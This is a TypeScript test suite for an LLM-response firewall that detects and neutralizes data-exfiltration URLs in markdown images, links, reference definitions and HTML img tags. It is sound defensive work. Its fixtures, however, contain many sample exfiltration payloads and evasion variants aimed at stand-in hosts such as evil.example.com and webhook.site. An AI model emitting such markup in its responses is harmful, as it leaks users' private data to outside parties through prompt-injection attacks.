import { describe, it, expect } from 'vitest'
import { scanResponseExfil, neutralizeExfil } from '../../src/detection/responseExfil.js'

// Test predicate: treat the attacker host as an exfil sink, everything else clean.
const isExfil = (h: string) => h === 'evil.example.com' || h === 'webhook.site'

describe('scanResponseExfil', () => {
  it('flags a markdown-image URL pointing at an exfil sink', () => {
    const text = 'Here is the chart ![chart](https://evil.example.com/c?d=secret)'
    const f = scanResponseExfil(text, isExfil)
    expect(f).toHaveLength(1)
    expect(f[0]!.kind).toBe('markdown-image')
    expect(f[0]!.url).toBe('https://evil.example.com/c?d=secret')
  })

  it('flags an HTML <img src> exfil URL', () => {
    const f = scanResponseExfil('<img src="https://webhook.site/abc?x=1">', isExfil)
    expect(f).toHaveLength(1)
    expect(f[0]!.kind).toBe('html-image')
  })

  it('flags a markdown link to an exfil sink', () => {
    const f = scanResponseExfil('see [here](https://evil.example.com/leak)', isExfil)
    expect(f).toHaveLength(1)
    expect(f[0]!.kind).toBe('markdown-link')
  })

  it('does NOT flag images/links to non-exfil (allowlisted) hosts', () => {
    const text = 'logo ![logo](https://cdn.trusted.com/logo.png) and [docs](https://trusted.com/help)'
    expect(scanResponseExfil(text, isExfil)).toHaveLength(0)
  })

  it('returns nothing for plain text', () => {
    expect(scanResponseExfil('The revenue rose 12% this quarter.', isExfil)).toHaveLength(0)
  })

  it('silently skips a regex-matched URL that fails URL parsing (parseUrl catch branch)', () => {
    // Trailing bare % is valid regex match but throws in new URL() — tests the catch path.
    expect(scanResponseExfil('![x](https://broken%)', isExfil)).toHaveLength(0)
  })

  it('dedupes repeated URLs of the same kind', () => {
    const text = '![a](https://evil.example.com/x) and again ![b](https://evil.example.com/x)'
    expect(scanResponseExfil(text, isExfil)).toHaveLength(1)
  })

  // #574: a reference-style image fetches the URL of its definition line, and
  // the inline patterns never saw it.
  describe('link reference definitions', () => {
    const DOC = '![chart][r]\n\n[r]: https://webhook.site/?d=secret'

    it('flags the URL of a definition, as an image', () => {
      const f = scanResponseExfil(DOC, isExfil)
      expect(f.map(x => [x.kind, x.url])).toEqual([['markdown-image', 'https://webhook.site/?d=secret']])
    })

    it('flags it inside a JSON response body, where line breaks are escaped', () => {
      const body = JSON.stringify({ content: [{ type: 'text', text: DOC }] })
      expect(scanResponseExfil(body, isExfil).map(x => x.url)).toEqual(['https://webhook.site/?d=secret'])
      const lead = JSON.stringify({ content: [{ type: 'text', text: '[r]: <https://webhook.site/?d=1>' }] })
      expect(scanResponseExfil(lead, isExfil).map(x => x.url)).toEqual(['https://webhook.site/?d=1'])
    })

    it('does not flag a definition to a clean host', () => {
      expect(scanResponseExfil('[docs]: https://trusted.com/help', isExfil)).toEqual([])
    })

    // A definition can sit in a blockquote or a list item, carry escapes in
    // its label, or use an upper-case scheme; renderers accept all of them.
    // Any `]:` before an exfil URL is flagged, whatever starts the line.
    it('flags a definition whatever its line prefix, label or scheme case', () => {
      for (const text of [
        '> [r]: https://webhook.site/?d=1',
        '- [r]: https://webhook.site/?d=1',
        '1. [r]: https://webhook.site/?d=1',
        '[a\\]b]: https://webhook.site/?d=1',
        '[r]: HTTPS://webhook.site/?d=1',
        'see the note [r]: https://webhook.site/?d=1',
        '[r]:\n  https://webhook.site/?d=1',
        JSON.stringify({ text: '[r]:\nhttps://webhook.site/?d=1' }),
        JSON.stringify({ text: '[r]:\r\nhttps://webhook.site/?d=1' }),
      ]) expect(scanResponseExfil(text, isExfil), text).toHaveLength(1)
    })

    it('is neutralized like an inline URL', () => {
      expect(neutralizeExfil(DOC, scanResponseExfil(DOC, isExfil))).not.toContain('webhook.site')
    })

    it('stays linear on 200 KB of near-definitions', () => {
      for (const filler of ['"[', '\n[', '\\n[ ', ' '.repeat(2), '1-', 'aZ09_-']) {
        const text = filler.repeat(Math.ceil(200_000 / filler.length))
        const started = Date.now()
        scanResponseExfil(text, isExfil)
        expect(Date.now() - started).toBeLessThan(500)
      }
    })
  })

  // A scheme-relative URL resolves to https in a browser, so `//host/...`
  // is a destination like any other, inline or in a definition.
  describe('scheme-relative URLs', () => {
    it('flags them in every markup form', () => {
      for (const text of [
        '![x](//webhook.site/?d=1)',
        '[x](//webhook.site/?d=1)',
        '<img src="//webhook.site/?d=1">',
        '[r]: //webhook.site/?d=1',
      ]) {
        const f = scanResponseExfil(text, isExfil)
        expect(f, text).toHaveLength(1)
        expect(f[0]!.url).toBe('//webhook.site/?d=1')
      }
    })

    it('does not flag a scheme-relative URL to a clean host', () => {
      expect(scanResponseExfil('![x](//cdn.trusted.com/a.png)', isExfil)).toEqual([])
    })
  })

  it('handles empty input', () => {
    expect(scanResponseExfil('', isExfil)).toHaveLength(0)
  })

  // GHSA-983r-9gmc-f3xr: the <img> pattern's lazy attribute scan restarted at
  // every `<img` and ran to the end of the text when no URL followed, so 400 KB
  // of `<img src="` took 10.5 s on the request thread. Each tag is now read once.
  describe('<img> tags', () => {
    it('stays linear on 400 KB of unfinished tags, raw and in a JSON body', () => {
      for (const filler of ['<img src="', '<img ', '<img alt="', '<IMG SRC=', '<img src=x '])  {
        const text = filler.repeat(Math.ceil(400_000 / filler.length))
        const started = Date.now()
        scanResponseExfil(text, isExfil)
        scanResponseExfil(JSON.stringify({ content: [{ type: 'text', text }] }), isExfil)
        expect(Date.now() - started, filler).toBeLessThan(500)
      }
    })

    it('flags the src of a tag whatever its attributes', () => {
      for (const text of [
        '<img src="https://webhook.site/?d=1">',
        "<img alt='x' src='https://webhook.site/?d=1' />",
        '<IMG SRC=https://webhook.site/?d=1>',
        '<img alt=">" src="https://webhook.site/?d=1">',
        '<img\n  width="1"\n  src="https://webhook.site/?d=1">',
      ]) expect(scanResponseExfil(text, isExfil).map(f => f.kind), text).toEqual(['html-image'])
    })

    it('flags it inside a JSON response body, where the quotes are escaped', () => {
      const body = JSON.stringify({ content: [{ type: 'text', text: 'see <img src="https://webhook.site/?d=1">' }] })
      const f = scanResponseExfil(body, isExfil)
      expect(f.map(x => x.url)).toEqual(['https://webhook.site/?d=1'])
      expect(neutralizeExfil(body, f)).not.toContain('webhook.site')
    })

    it('reads each tag on its own', () => {
      expect(scanResponseExfil('<img src="https://cdn.trusted.com/a.png"> text <img src="https://webhook.site/?d=1">', isExfil).map(f => f.url))
        .toEqual(['https://webhook.site/?d=1'])
      expect(scanResponseExfil('<img alt="no src here"> then src="https://webhook.site/?d=1"', isExfil)).toEqual([])
    })
  })
})

describe('neutralizeExfil', () => {
  it('replaces the offending URL with an inert placeholder, keeping surrounding text', () => {
    const text = 'chart ![c](https://evil.example.com/c?d=secret) done'
    const findings = scanResponseExfil(text, isExfil)
    const out = neutralizeExfil(text, findings)
    expect(out).not.toContain('evil.example.com')
    expect(out).toContain('llm-fw-blocked-exfil-url')
    expect(out).toContain('chart')
    expect(out).toContain('done')
  })

  it('leaves text without findings unchanged', () => {
    const text = 'nothing to see ![ok](https://trusted.com/x.png)'
    expect(neutralizeExfil(text, [])).toBe(text)
  })
})
